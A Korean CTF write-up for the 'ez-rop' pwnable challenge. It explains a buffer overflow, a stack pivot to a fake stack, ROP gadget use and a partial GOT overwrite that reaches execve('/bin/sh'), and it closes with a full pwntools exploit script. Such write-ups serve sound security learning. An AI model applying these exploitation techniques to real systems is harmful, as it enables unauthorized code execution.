+++
title = "CyberSpace CTF 2024 - ez-rop"
date = "2024-09-15"
description = "CyberSpace CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "fake stack", "rop"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/ez-rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

## 0x01. Vulnerability
``` c
char *sub_401192()
{
  char s[96]; // [rsp+0h] [rbp-60h] BYREF

  return fgets(s, 116, stdin);
}
```
단순한 BOF가 발생하지만 `s`를 채우는 데에 `0x60` 바이트를 사용해야 하므로 return 이후에 구성할 수 있는 stack이 거의 없다.

## 0x02. Exploit
### Fake Stack
취약점을 이용해서 당장 `rip`를 control해도 할 수 있는 것이 없기 때문에, payload를 구성할 수 있는 영역을 찾아보았다.
``` bash
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/user/chall
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/user/chall
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/user/chall
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/user/chall
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/user/chall
...
```
PIE가 꺼져있기 때문에 DATA 영역인 `0x404000` 영역의 주소가 고정되어있다.

`sub_401192()`가 종료될 때 `leave; ret`을 하므로, 대충 중간쯤인 `0x404800`을 sfp에 넣어두면 `rsp`를 해당 값으로 조작할 수 있다.

이제 `rsp`를 입력을 받는 함수의 인자로 전달해야 하는데, 쓸만한 가젯이 없었다.

대신 `fgets`로 입력을 받는 과정에서 `rdi`의 값이 `rax`, `rbp`를 통해 설정된다는 것을 이용해서 값을 전달할 수 있었다.
```
.text:0000000000401192                 push    rbp
.text:0000000000401193                 mov     rbp, rsp
.text:0000000000401196                 sub     rsp, 60h
.text:000000000040119A                 mov     rdx, cs:stdin   ; stream
.text:00000000004011A1                 lea     rax, [rbp-60h]
.text:00000000004011A5                 mov     esi, 74h ; 't'  ; n
.text:00000000004011AA                 mov     rdi, rax        ; s
.text:00000000004011AD                 call    _fgets
.text:00000000004011B2                 xor     rdx, rdx
.text:00000000004011B5                 nop
.text:00000000004011B6                 leave
.text:00000000004011B7                 retn
```
따라서 payload를 다음과 같이 작성하였다.
``` python
    # fgets(0x4047a0, 0x74, stdin)
    payload = b"A" * 0x60
    payload += p64(0x404800)                # rbp = 0x404800
    payload += p64(0x401196)                # middle of fgets
    payload += b"\x00\x00\x00"              # dummy
    
    s.send(payload)
    sleep(0.5)
```

### Return Oriented Programming
이제 payload를 이용해서 쉘을 띄우면 되는데, `pop` 가젯이 많지 않았는데, IDA로 확인해보니 쓸만한 가젯은 삭제하고 다음 네 가젯을 이용한 문제 해결을 의도한 것 같았다.
```
# mov rdi, rsi gadget
.text:0000000000401156                 push    rbp
.text:0000000000401157                 mov     rbp, rsp
.text:000000000040115A                 mov     rdi, rsi
.text:000000000040115D                 retn

# pop rbp gadget
.text:000000000040115F                 pop     rbp
.text:0000000000401160                 retn

# pop rsi gadget
.text:0000000000401161                 push    rbp
.text:0000000000401162                 mov     rbp, rsp
.text:0000000000401165                 pop     rsi
.text:0000000000401166                 retn

# read(0, buf, 8) gadget
.text:000000000040116A                 push    rbp
.text:000000000040116B                 mov     rbp, rsp
.text:000000000040116E                 sub     rsp, 10h
.text:0000000000401172                 lea     rax, [rbp-8h]
.text:0000000000401176                 mov     edx, 8          ; nbytes
.text:000000000040117B                 mov     rsi, rax        ; buf
.text:000000000040117E                 mov     edi, 0          ; fd
.text:0000000000401183                 call    _read
.text:0000000000401188                 xor     rdx, rdx
.text:000000000040118B                 xor     rax, rax
.text:000000000040118E                 retn
```
특이하게 `read` 가젯이 있었는데, `fgets`와 비슷하게 `rbp` 값에서 `8`을 뺀 값이 `rax`를 통해 `rsi`로 전달된다.

`rbp`는 `pop rbp` 가젯을 이용하여 자유롭게 값을 설정할 수 있으니 `lea rax, [rbp-8h]` instruction을 감안해서 입력받을 주소에 `8`을 더해서 `rbp` 값을 설정하면 된다.

이 때 설정해둔 `rsp` 값을 변경시키지 않기 위해 `read` 가젯의 중간인 `0x401172` 주소로 바로 뛰도록 payload를 구성했다.
``` python
    # read(0, alarm.got, 8) ; alarm.got = 0x404008
    # rdi = 0, rsi = alarm.got, rdx = 8
    payload = p64(elf.got['alarm'] + 8)     # alarm.got + 8
    payload += p64(0x401172)                # middle of read
```
여기에서 `alarm`의 GOT에 값을 쓰기로 했는데, libc를 leak하기 위한 출력 함수가 하나도 없기 때문에 `execve`와 가장 가까운 함수를 찾아 partial overwrite를 하기 위함이다.

가장 가깝다는 것은 offset 차이가 가장 조금 난다는 것이고, 가까운 함수의 GOT를 덮어 쓴 것은 aslr에 의한 exploit 확률을 최대한 높일 수 있기 때문이다.

이후에는 `execve` 함수 인자를 맞춰주기 위해 `"/bin/sh\x00"`를 메모리에 써두고 가젯을 이용해 전달하는 과정만 수행해주면 된다.
``` python
    # read(0, 0x404900, 8) ; &0x404900 = "/bin/sh\x00"
    pop_rbp = 0x401168
    payload += p64(pop_rbp)
    payload += p64(0x404908)                # 0x404900 + 8
    payload += p64(0x401172)
    
    # execve("/bin/sh", 0, 0)
    # rdi = 0x404900, rsi = 0, rdx = 0
    mov_rdi_rsi = 0x40115a
    pop_rsi = 0x401165
    payload += p64(mov_rdi_rsi)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(elf.plt['alarm'])

    payload += b"B" * (0x60 - len(payload))
    payload += p64(0x4047a0)
    payload += p64(0x401190)
    payload += b"\x00\x00\x00"
    log.info(f"payload len : {hex(len(payload))}")

    s.send(payload)
    sleep(0.5)
```

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc-2.31.so"
CONTAINER = "44c6741a4dc0"
bp = {
    'main' : 0x4011B8,
    'leave_after_fgets' : 0x4011b6,
    'ret_after_fgets' : 0x4011B7,
}

gs = f'''
b *{bp["leave_after_fgets"]}
b *{0x401183}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote("0.0.0.0", port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    # fgets(0x4047a0, 0x74, stdin)
    payload = b"A" * 0x60
    payload += p64(0x404800)                # rbp = 0x404800
    payload += p64(0x401196)                # middle of fgets
    payload += b"\x00\x00\x00"              # dummy
    
    s.send(payload)
    sleep(0.5)

    # read(0, alarm.got, 8) ; alarm.got = 0x404008
    # rdi = 0, rsi = alarm.got, rdx = 8
    payload = p64(elf.got['alarm'] + 8)     # alarm.got + 8
    payload += p64(0x401172)                # middle of read

    # read(0, 0x404900, 8) ; &0x404900 = "/bin/sh\x00"
    pop_rbp = 0x401168
    payload += p64(pop_rbp)
    payload += p64(0x404908)                # 0x404900 + 8
    payload += p64(0x401172)
    
    # execve("/bin/sh", 0, 0)
    # rdi = 0x404900, rsi = 0, rdx = 0
    mov_rdi_rsi = 0x40115a
    pop_rsi = 0x401165
    payload += p64(mov_rdi_rsi)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(elf.plt['alarm'])

    payload += b"B" * (0x60 - len(payload))
    payload += p64(0x4047a0)
    payload += p64(0x401190)
    payload += b"\x00\x00\x00"
    log.info(f"payload len : {hex(len(payload))}")

    s.send(payload)
    sleep(0.5)

    # read(0, alarm.got, 8)
    payload = b"\x80\xb0"
    # payload = b"\x80\x50"
    s.send(payload)
    sleep(0.5)

    # read(0, 0x404900, 8)
    payload = b"/bin/sh\x00"
    s.send(payload)
    sleep(0.5)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```